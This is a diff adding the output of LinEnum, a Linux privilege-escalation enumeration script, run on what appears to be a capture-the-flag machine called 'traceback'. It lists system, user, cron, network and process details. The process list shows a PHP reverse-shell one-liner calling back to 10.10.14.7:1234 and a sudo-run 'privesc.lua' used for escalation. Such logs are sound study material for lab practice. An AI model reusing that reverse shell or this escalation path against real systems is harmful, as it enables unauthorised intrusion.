@@ -1,0 +1,1172 @@
+-e 
+[00;31m#########################################################[00m
+-e [00;31m#[00m [00;33mLocal Linux Enumeration & Privilege Escalation Script[00m [00;31m#[00m
+-e [00;31m#########################################################[00m
+-e [00;33m# www.rebootuser.com[00m
+-e [00;33m# version 0.982[00m
+
+[-] Debug Info
+-e [00;33m[+] Thorough tests = Disabled[00m
+-e 
+
+-e [00;33mScan started at:
+Sat Apr  4 05:02:40 PDT 2020
+-e [00m
+
+-e [00;33m### SYSTEM ##############################################[00m
+-e [00;31m[-] Kernel information:[00m
+Linux traceback 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+-e 
+
+-e [00;31m[-] Kernel information (continued):[00m
+Linux version 4.15.0-58-generic (buildd@lcy01-amd64-013) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019
+-e 
+
+-e [00;31m[-] Specific release information:[00m
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=18.04
+DISTRIB_CODENAME=bionic
+DISTRIB_DESCRIPTION="Ubuntu 18.04.3 LTS"
+NAME="Ubuntu"
+VERSION="18.04.3 LTS (Bionic Beaver)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 18.04.3 LTS"
+VERSION_ID="18.04"
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+VERSION_CODENAME=bionic
+UBUNTU_CODENAME=bionic
+-e 
+
+-e [00;31m[-] Hostname:[00m
+traceback
+-e 
+
+-e [00;33m### USER/GROUP ##########################################[00m
+-e [00;31m[-] Current user/group info:[00m
+uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
+-e 
+
+-e [00;31m[-] Users that have previously logged onto the system:[00m
+Username         Port     From             Latest
+root             tty1                      Fri Jan 24 03:43:29 -0800 2020
+webadmin         pts/0    10.10.14.3       Thu Feb 27 06:29:02 -0800 2020
+sysadmin         pts/0    10.10.14.2       Mon Mar 16 03:50:24 -0700 2020
+-e 
+
+-e [00;31m[-] Who else is logged on:[00m
+ 05:02:40 up 42 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+-e 
+
+-e [00;31m[-] Group memberships:[00m
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
+uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
+uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
+uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
+uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=105(uuidd) gid=109(uuidd) groups=109(uuidd)
+uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
+uid=106(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
+-e 
+
+-e [00;31m[-] Contents of /etc/passwd:[00m
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
+webadmin:x:1000:1000:traceback,,,:/home/webadmin:/bin/bash
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+sysadmin:x:1001:1001::/home/sysadmin:/bin/sh
+-e 
+
+-e [00;31m[-] Super user account(s):[00m
+root
+-e 
+
+-e [00;31m[-] Are permissions on /home directories lax:[00m
+total 16K
+drwxr-xr-x  4 root     root     4.0K Aug 25  2019 .
+drwxr-xr-x 22 root     root     4.0K Aug 25  2019 ..
+drwxr-x---  5 sysadmin sysadmin 4.0K Apr  4 05:02 sysadmin
+drwxr-x---  5 webadmin sysadmin 4.0K Mar 16 04:03 webadmin
+-e 
+
+-e [00;33m### ENVIRONMENTAL #######################################[00m
+-e [00;31m[-] Environment information:[00m
+SUDO_GID=1000
+MAIL=/var/mail/sysadmin
+LANGUAGE=en_US:
+USER=sysadmin
+HOME=/home/sysadmin
+OLDPWD=/home/sysadmin/.ssh
+SUDO_UID=1000
+LOGNAME=sysadmin
+USERNAME=sysadmin
+TERM=unknown
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+LANG=C
+SUDO_COMMAND=/home/sysadmin/luvit privesc.lua
+SHELL=/bin/sh
+SUDO_USER=webadmin
+PWD=/home/sysadmin
+-e 
+
+-e [00;31m[-] Path information:[00m
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+-e drwxr-xr-x 2 root root  4096 Aug 23  2019 /bin
+drwxr-xr-x 2 root root  4096 Aug 23  2019 /sbin
+drwxr-xr-x 2 root root 20480 Mar 15 10:46 /usr/bin
+drwxr-xr-x 2 root root  4096 Feb  9  2019 /usr/local/bin
+drwxr-xr-x 2 root root  4096 Feb  9  2019 /usr/local/sbin
+drwxr-xr-x 2 root root  4096 Aug 24  2019 /usr/sbin
+-e 
+
+-e [00;31m[-] Available shells:[00m
+# /etc/shells: valid login shells
+/bin/sh
+/bin/bash
+/bin/rbash
+/bin/dash
+-e 
+
+-e [00;31m[-] Current umask value:[00m
+0022
+u=rwx,g=rx,o=rx
+-e 
+
+-e [00;31m[-] umask value as specified in /etc/login.defs:[00m
+UMASK		022
+-e 
+
+-e [00;31m[-] Password and storage information:[00m
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+-e 
+
+-e [00;33m### JOBS/TASKS ##########################################[00m
+-e [00;31m[-] Cron jobs:[00m
+-rw-r--r-- 1 root root  722 Nov 15  2017 /etc/crontab
+
+/etc/cron.d:
+total 20
+drwxr-xr-x  2 root root 4096 Aug 24  2019 .
+drwxr-xr-x 80 root root 4096 Mar 16 03:55 ..
+-rw-r--r--  1 root root  102 Nov 15  2017 .placeholder
+-rw-r--r--  1 root root  712 Jan 17  2018 php
+-rw-r--r--  1 root root  191 Aug 23  2019 popularity-contest
+
+/etc/cron.daily:
+total 52
+drwxr-xr-x  2 root root 4096 Aug 24  2019 .
+drwxr-xr-x 80 root root 4096 Mar 16 03:55 ..
+-rw-r--r--  1 root root  102 Nov 15  2017 .placeholder
+-rwxr-xr-x  1 root root  539 Jul 16  2019 apache2
+-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
+-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
+-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
+-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
+-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
+-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
+-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
+-rwxr-xr-x  1 root root 3477 Feb 20  2018 popularity-contest
+-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Aug 23  2019 .
+drwxr-xr-x 80 root root 4096 Mar 16 03:55 ..
+-rw-r--r--  1 root root  102 Nov 15  2017 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x  2 root root 4096 Aug 23  2019 .
+drwxr-xr-x 80 root root 4096 Mar 16 03:55 ..
+-rw-r--r--  1 root root  102 Nov 15  2017 .placeholder
+
+/etc/cron.weekly:
+total 16
+drwxr-xr-x  2 root root 4096 Aug 23  2019 .
+drwxr-xr-x 80 root root 4096 Mar 16 03:55 ..
+-rw-r--r--  1 root root  102 Nov 15  2017 .placeholder
+-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
+-e 
+
+-e [00;31m[-] Crontab contents:[00m
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+-e 
+
+-e [00;31m[-] Systemd timers:[00m
+NEXT                         LEFT           LAST                         PASSED       UNIT                         ACTIVATES
+Sat 2020-04-04 05:09:00 PDT  6min left      Sat 2020-04-04 04:39:01 PDT  23min ago    phpsessionclean.timer        phpsessionclean.service
+Sat 2020-04-04 06:21:25 PDT  1h 18min left  Sat 2020-04-04 04:20:46 PDT  41min ago    apt-daily-upgrade.timer      apt-daily-upgrade.service
+Sat 2020-04-04 12:15:30 PDT  7h left        Sat 2020-04-04 04:20:46 PDT  41min ago    apt-daily.timer              apt-daily.service
+Sat 2020-04-04 17:54:12 PDT  12h left       Sat 2020-04-04 04:58:16 PDT  4min 26s ago motd-news.timer              motd-news.service
+Sun 2020-04-05 04:35:34 PDT  23h left       Sat 2020-04-04 04:35:34 PDT  27min ago    systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+Mon 2020-04-06 00:00:00 PDT  1 day 18h left Sat 2020-04-04 04:20:46 PDT  41min ago    fstrim.timer                 fstrim.service
+
+6 timers listed.
+[2mEnable thorough tests to see inactive timers[00m
+-e 
+
+-e [00;33m### NETWORKING  ##########################################[00m
+-e [00;31m[-] Network and IP info:[00m
+ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.10.10.181  netmask 255.255.255.0  broadcast 10.10.10.255
+        inet6 dead:beef::250:56ff:feb9:5996  prefixlen 64  scopeid 0x0<global>
+        inet6 fe80::250:56ff:feb9:5996  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:b9:59:96  txqueuelen 1000  (Ethernet)
+        RX packets 161096  bytes 12094998 (12.0 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 80003  bytes 20000254 (20.0 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 3762  bytes 317237 (317.2 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 3762  bytes 317237 (317.2 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+-e 
+
+-e [00;31m[-] ARP history:[00m
+? (10.10.10.2) at 00:50:56:b9:c7:85 [ether] on ens33
+-e 
+
+-e [00;31m[-] Nameserver(s):[00m
+nameserver 127.0.0.53
+-e 
+
+-e [00;31m[-] Nameserver(s):[00m
+Global
+          DNSSEC NTA: 10.in-addr.arpa
+                      16.172.in-addr.arpa
+                      168.192.in-addr.arpa
+                      17.172.in-addr.arpa
+                      18.172.in-addr.arpa
+                      19.172.in-addr.arpa
+                      20.172.in-addr.arpa
+                      21.172.in-addr.arpa
+                      22.172.in-addr.arpa
+                      23.172.in-addr.arpa
+                      24.172.in-addr.arpa
+                      25.172.in-addr.arpa
+                      26.172.in-addr.arpa
+                      27.172.in-addr.arpa
+                      28.172.in-addr.arpa
+                      29.172.in-addr.arpa
+                      30.172.in-addr.arpa
+                      31.172.in-addr.arpa
+                      corp
+                      d.f.ip6.arpa
+                      home
+                      internal
+                      intranet
+                      lan
+                      local
+                      private
+                      test
+
+Link 2 (ens33)
+      Current Scopes: DNS
+       LLMNR setting: yes
+MulticastDNS setting: no
+      DNSSEC setting: no
+    DNSSEC supported: no
+         DNS Servers: 8.8.8.8
+                      8.8.4.4
+-e 
+
+-e [00;31m[-] Default route:[00m
+default         10.10.10.2      0.0.0.0         UG    0      0        0 ens33
+-e 
+
+-e [00;31m[-] Listening TCP:[00m
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+-e 
+
+-e [00;31m[-] Listening UDP:[00m
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+-e 
+
+-e [00;33m### SERVICES #############################################[00m
+-e [00;31m[-] Running processes:[00m
+USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root          1  0.1  0.2 159356  8588 ?        Ss   04:20   0:04 /sbin/init noprompt
+root          2  0.0  0.0      0     0 ?        S    04:20   0:00 [kthreadd]
+root          4  0.0  0.0      0     0 ?        I<   04:20   0:00 [kworker/0:0H]
+root          6  0.0  0.0      0     0 ?        I<   04:20   0:00 [mm_percpu_wq]
+root          7  0.0  0.0      0     0 ?        S    04:20   0:00 [ksoftirqd/0]
+root          8  0.0  0.0      0     0 ?        I    04:20   0:00 [rcu_sched]
+root          9  0.0  0.0      0     0 ?        I    04:20   0:00 [rcu_bh]
+root         10  0.0  0.0      0     0 ?        S    04:20   0:00 [migration/0]
+root         11  0.0  0.0      0     0 ?        S    04:20   0:00 [watchdog/0]
+root         12  0.0  0.0      0     0 ?        S    04:20   0:00 [cpuhp/0]
+root         13  0.0  0.0      0     0 ?        S    04:20   0:00 [cpuhp/1]
+root         14  0.0  0.0      0     0 ?        S    04:20   0:00 [watchdog/1]
+root         15  0.0  0.0      0     0 ?        S    04:20   0:00 [migration/1]
+root         16  0.0  0.0      0     0 ?        S    04:20   0:00 [ksoftirqd/1]
+root         18  0.0  0.0      0     0 ?        I<   04:20   0:00 [kworker/1:0H]
+root         19  0.0  0.0      0     0 ?        S    04:20   0:00 [cpuhp/2]
+root         20  0.0  0.0      0     0 ?        S    04:20   0:00 [watchdog/2]
+root         21  0.0  0.0      0     0 ?        S    04:20   0:00 [migration/2]
+root         22  0.0  0.0      0     0 ?        S    04:20   0:00 [ksoftirqd/2]
+root         24  0.0  0.0      0     0 ?        I<   04:20   0:00 [kworker/2:0H]
+root         25  0.0  0.0      0     0 ?        S    04:20   0:00 [cpuhp/3]
+root         26  0.0  0.0      0     0 ?        S    04:20   0:00 [watchdog/3]
+root         27  0.0  0.0      0     0 ?        S    04:20   0:00 [migration/3]
+root         28  0.0  0.0      0     0 ?        S    04:20   0:00 [ksoftirqd/3]
+root         30  0.0  0.0      0     0 ?        I<   04:20   0:00 [kworker/3:0H]
+root         31  0.0  0.0      0     0 ?        S    04:20   0:00 [kdevtmpfs]
+root         32  0.0  0.0      0     0 ?        I<   04:20   0:00 [netns]
+root         33  0.0  0.0      0     0 ?        S    04:20   0:00 [rcu_tasks_kthre]
+root         34  0.0  0.0      0     0 ?        S    04:20   0:00 [kauditd]
+root         35  0.0  0.0      0     0 ?        I    04:20   0:00 [kworker/0:1]
+root         36  0.0  0.0      0     0 ?        S    04:20   0:00 [khungtaskd]
+root         37  0.0  0.0      0     0 ?        S    04:20   0:00 [oom_reaper]
+root         38  0.0  0.0      0     0 ?        I<   04:20   0:00 [writeback]
+root         39  0.0  0.0      0     0 ?        S    04:20   0:00 [kcompactd0]
+root         40  0.0  0.0      0     0 ?        SN   04:20   0:00 [ksmd]
+root         41  0.0  0.0      0     0 ?        SN   04:20   0:00 [khugepaged]
+root         42  0.0  0.0      0     0 ?        I<   04:20   0:00 [crypto]
+root         43  0.0  0.0      0     0 ?        I<   04:20   0:00 [kintegrityd]
+root         44  0.0  0.0      0     0 ?        I<   04:20   0:00 [kblockd]
+root         45  0.0  0.0      0     0 ?        I<   04:20   0:00 [ata_sff]
+root         46  0.0  0.0      0     0 ?        I<   04:20   0:00 [md]
+root         47  0.0  0.0      0     0 ?        I<   04:20   0:00 [edac-poller]
+root         48  0.0  0.0      0     0 ?        I<   04:20   0:00 [devfreq_wq]
+root         49  0.0  0.0      0     0 ?        I<   04:20   0:00 [watchdogd]
+root         50  0.0  0.0      0     0 ?        I    04:20   0:00 [kworker/u256:1]
+root         51  0.0  0.0      0     0 ?        I    04:20   0:01 [kworker/2:1]
+root         52  0.0  0.0      0     0 ?        I    04:20   0:00 [kworker/1:1]
+root         53  0.0  0.0      0     0 ?        I    04:20   0:00 [kworker/3:1]
+root         55  0.0  0.0      0     0 ?        S    04:20   0:00 [kswapd0]
+root         56  0.0  0.0      0     0 ?        I<   04:20   0:00 [kworker/u257:0]
+root         57  0.0  0.0      0     0 ?        S    04:20   0:00 [ecryptfs-kthrea]
+root         99  0.0  0.0      0     0 ?        I<   04:20   0:00 [kthrotld]
+root        100  0.0  0.0      0     0 ?        I<   04:20   0:00 [acpi_thermal_pm]
+root        101  0.0  0.0      0     0 ?        S    04:20   0:00 [scsi_eh_0]
+root        102  0.0  0.0      0     0 ?        I<   04:20   0:00 [scsi_tmf_0]
+root        103  0.0  0.0      0     0 ?        S    04:20   0:00 [scsi_eh_1]
+root        104  0.0  0.0      0     0 ?        I<   04:20   0:00 [scsi_tmf_1]
+root        110  0.0  0.0      0     0 ?        I<   04:20   0:00 [ipv6_addrconf]
+root        119  0.0  0.0      0     0 ?        I<   04:20   0:00 [kstrp]
+root        136  0.0  0.0      0     0 ?        I<   04:20   0:00 [charger_manager]
+root        138  0.0  0.0      0     0 ?        I    04:20   0:00 [kworker/0:2]
+root        194  0.0  0.0      0     0 ?        I<   04:20   0:00 [mpt_poll_0]
+root        195  0.0  0.0      0     0 ?        I<   04:20   0:00 [mpt/0]
+root        197  0.0  0.0      0     0 ?        S    04:20   0:00 [scsi_eh_2]
+root        198  0.0  0.0      0     0 ?        I<   04:20   0:00 [scsi_tmf_2]
+root        199  0.0  0.0      0     0 ?        I<   04:20   0:00 [kworker/0:1H]
+root        201  0.0  0.0      0     0 ?        I<   04:20   0:00 [kworker/2:1H]
+root        211  0.0  0.0      0     0 ?        I<   04:20   0:00 [kworker/3:1H]
+root        215  0.0  0.0      0     0 ?        I<   04:20   0:00 [kworker/1:1H]
+root        223  0.0  0.0      0     0 ?        S    04:20   0:00 [jbd2/sda1-8]
+root        224  0.0  0.0      0     0 ?        I<   04:20   0:00 [ext4-rsv-conver]
+root        258  0.0  0.3 111372 13112 ?        S<s  04:20   0:00 /lib/systemd/systemd-journald
+root        277  0.0  0.1  46624  5580 ?        Ss   04:20   0:02 /lib/systemd/systemd-udevd
+root        279  0.0  0.0      0     0 ?        I<   04:20   0:00 [ttm_swap]
+root        280  0.0  0.0      0     0 ?        S    04:20   0:00 [irq/16-vmwgfx]
+systemd+    304  0.0  0.1  71848  5288 ?        Ss   04:20   0:00 /lib/systemd/systemd-networkd
+root        305  0.0  0.0 158788   276 ?        Ssl  04:20   0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid
+root        321  0.0  0.0      0     0 ?        I    04:20   0:00 [kworker/3:2]
+root        408  0.0  0.0      0     0 ?        I    04:20   0:00 [kworker/2:2]
+root        411  0.0  0.2  88224  9696 ?        Ss   04:20   0:00 /usr/bin/VGAuthService
+systemd+    413  0.0  0.1  70892  6300 ?        Ss   04:20   0:00 /lib/systemd/systemd-resolved
+systemd+    414  0.0  0.0 141928  3144 ?        Ssl  04:20   0:00 /lib/systemd/systemd-timesyncd
+root        415  0.0  0.2 201876 11608 ?        Ssl  04:20   0:01 /usr/bin/vmtoolsd
+root        426  0.0  0.1 287544  6908 ?        Ssl  04:20   0:00 /usr/lib/accountsservice/accounts-daemon
+root        428  0.0  0.0 110512  3496 ?        Ssl  04:20   0:00 /usr/sbin/irqbalance --foreground
+root        429  0.0  0.0  31320  3156 ?        Ss   04:20   0:00 /usr/sbin/cron -f
+syslog      434  0.0  0.1 263036  4592 ?        Ssl  04:20   0:00 /usr/sbin/rsyslogd -n
+message+    438  0.0  0.1  50036  4504 ?        Ss   04:20   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+root        475  0.0  0.4 170524 17192 ?        Ssl  04:20   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+root        476  0.0  0.1  62020  5760 ?        Ss   04:20   0:00 /lib/systemd/systemd-logind
+root        509  0.0  0.0  16180  1924 tty1     Ss+  04:20   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+root        524  0.0  0.1  72296  6352 ?        Ss   04:20   0:00 /usr/sbin/sshd -D
+root        551  0.0  0.4 327120 16636 ?        Ss   04:20   0:00 /usr/sbin/apache2 -k start
+webadmin    572  0.0  0.3 331968 15444 ?        S    04:20   0:00 /usr/sbin/apache2 -k start
+webadmin    832  0.0  0.3 331912 14440 ?        S    04:24   0:00 /usr/sbin/apache2 -k start
+webadmin    835  0.0  0.3 331912 14480 ?        S    04:24   0:00 /usr/sbin/apache2 -k start
+webadmin    845  0.0  0.3 331912 14484 ?        S    04:24   0:00 /usr/sbin/apache2 -k start
+webadmin    857  0.0  0.3 331912 14444 ?        S    04:24   0:00 /usr/sbin/apache2 -k start
+webadmin    872  0.0  0.3 331984 14540 ?        S    04:24   0:00 /usr/sbin/apache2 -k start
+webadmin    876  0.0  0.3 331912 14484 ?        S    04:24   0:00 /usr/sbin/apache2 -k start
+webadmin    877  0.0  0.2 331580  8956 ?        S    04:24   0:00 /usr/sbin/apache2 -k start
+webadmin    900  0.0  0.3 332416 14844 ?        S    04:24   0:00 /usr/sbin/apache2 -k start
+webadmin   1015  0.0  0.3 331904 14432 ?        S    04:33   0:00 /usr/sbin/apache2 -k start
+root       1411  0.0  0.0      0     0 ?        I    04:39   0:00 [kworker/1:0]
+root       1631  0.0  0.0      0     0 ?        I    04:51   0:00 [kworker/u256:2]
+root       1714  0.0  0.0      0     0 ?        I    04:57   0:00 [kworker/u256:0]
+root       1739  0.0  0.0      0     0 ?        I    04:58   0:00 [kworker/1:2]
+webadmin   1799  0.0  0.0   4628   872 ?        S    04:59   0:00 sh -c php -r '$sock=fsockopen("10.10.14.7",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+webadmin   1800  0.0  0.3 133768 14524 ?        S    04:59   0:00 php -r $sock=fsockopen("10.10.14.7",1234);exec("/bin/sh -i <&3 >&3 2>&3");
+webadmin   1801  0.0  0.0   4628   804 ?        S    04:59   0:00 sh -c /bin/sh -i <&3 >&3 2>&3
+webadmin   1802  0.0  0.0   4628   784 ?        S    04:59   0:00 /bin/sh -i
+webadmin   1804  0.0  0.3 133768 14400 ?        S    04:59   0:00 php -r $sock=fsockopen("10.10.14.7",1234);exec("/bin/sh -i <&3 >&3 2>&3");
+webadmin   1805  0.0  0.0   4628   812 ?        S    04:59   0:00 sh -c /bin/sh -i <&3 >&3 2>&3
+webadmin   1806  0.0  0.0   4628   856 ?        S    04:59   0:00 /bin/sh -i
+root       1813  0.0  0.0  60580  3776 ?        S    05:00   0:00 sudo -u sysadmin /home/sysadmin/luvit privesc.lua
+sysadmin   1814  0.0  0.1  54380  6424 ?        Sl   05:00   0:00 /home/sysadmin/luvit privesc.lua
+sysadmin   1819  0.0  0.0   4628   876 ?        S    05:00   0:00 sh -c /bin/sh
+sysadmin   1820  0.0  0.0   4628   816 ?        S    05:00   0:00 /bin/sh
+sysadmin   1821  0.0  0.0   4628  1668 ?        S    05:00   0:00 /bin/sh -i
+sysadmin   1849  0.0  0.0   4940  1856 ?        S    05:02   0:00 sh LinEnum.sh
+sysadmin   1850  0.0  0.0   4940  1384 ?        S    05:02   0:00 sh LinEnum.sh
+sysadmin   1851  0.0  0.0   4536   812 ?        S    05:02   0:00 tee -a
+root       1987  0.0  0.0  58792  3120 ?        S    05:03   0:00 /usr/sbin/CRON -f
+root       1991  0.0  0.0   4628   772 ?        Ss   05:03   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
+root       1992  0.0  0.0   7468   776 ?        S    05:03   0:00 sleep 30
+sysadmin   2006  0.0  0.0  36700  3144 ?        R    05:03   0:00 ps aux
+-e 
+
+-e [00;31m[-] Process binaries and associated permissions (from above list):[00m
+lrwxrwxrwx 1 root     root           4 Aug 23  2019 /bin/sh -> dash
+-rwxrwxr-x 1 sysadmin sysadmin 4397566 Aug 24  2019 /home/sysadmin/luvit
+-rwxr-xr-x 1 root     root      129096 Jul 22  2019 /lib/systemd/systemd-journald
+-rwxr-xr-x 1 root     root      219272 Jul 22  2019 /lib/systemd/systemd-logind
+-rwxr-xr-x 1 root     root     1625168 Jul 22  2019 /lib/systemd/systemd-networkd
+-rwxr-xr-x 1 root     root      378944 Jul 22  2019 /lib/systemd/systemd-resolved
+-rwxr-xr-x 1 root     root       38976 Jul 22  2019 /lib/systemd/systemd-timesyncd
+-rwxr-xr-x 1 root     root      584136 Jul 22  2019 /lib/systemd/systemd-udevd
+-rwxr-xr-x 1 root     root       56552 Oct 15  2018 /sbin/agetty
+lrwxrwxrwx 1 root     root          20 Jul 22  2019 /sbin/init -> /lib/systemd/systemd
+-rwxr-xr-x 1 root     root      125144 May 14  2019 /usr/bin/VGAuthService
+-rwxr-xr-x 1 root     root      236584 Jun 10  2019 /usr/bin/dbus-daemon
+lrwxrwxrwx 1 root     root           9 Aug 23  2019 /usr/bin/python3 -> python3.6
+-rwxr-xr-x 1 root     root       51456 May 14  2019 /usr/bin/vmtoolsd
+-rwxr-xr-x 1 root     root      182552 Dec 17  2017 /usr/lib/accountsservice/accounts-daemon
+-rwxr-xr-x 1 root     root      671392 Jul 16  2019 /usr/sbin/apache2
+-rwxr-xr-x 1 root     root       47416 Nov 15  2017 /usr/sbin/cron
+-rwxr-xr-x 1 root     root       64184 Jan  9  2019 /usr/sbin/irqbalance
+-rwxr-xr-x 1 root     root      680488 Apr 24  2018 /usr/sbin/rsyslogd
+-rwxr-xr-x 1 root     root      786856 Mar  4  2019 /usr/sbin/sshd
+-e 
+
+-e [00;31m[-] /etc/init.d/ binary permissions:[00m
+total 112
+drwxr-xr-x  2 root root 4096 Aug 24  2019 .
+drwxr-xr-x 80 root root 4096 Mar 16 03:55 ..
+-rwxr-xr-x  1 root root 2489 Jul 16  2019 apache-htcacheclean
+-rwxr-xr-x  1 root root 8181 Jul 16  2019 apache2
+-rwxr-xr-x  1 root root 4335 Mar 22  2018 apparmor
+-rwxr-xr-x  1 root root 1232 Apr 18  2018 console-setup.sh
+-rwxr-xr-x  1 root root 3049 Nov 15  2017 cron
+-rwxr-xr-x  1 root root 2813 Nov 15  2017 dbus
+-rwxr-xr-x  1 root root  985 Mar 18  2019 grub-common
+-rwxr-xr-x  1 root root 3809 Feb 14  2018 hwclock.sh
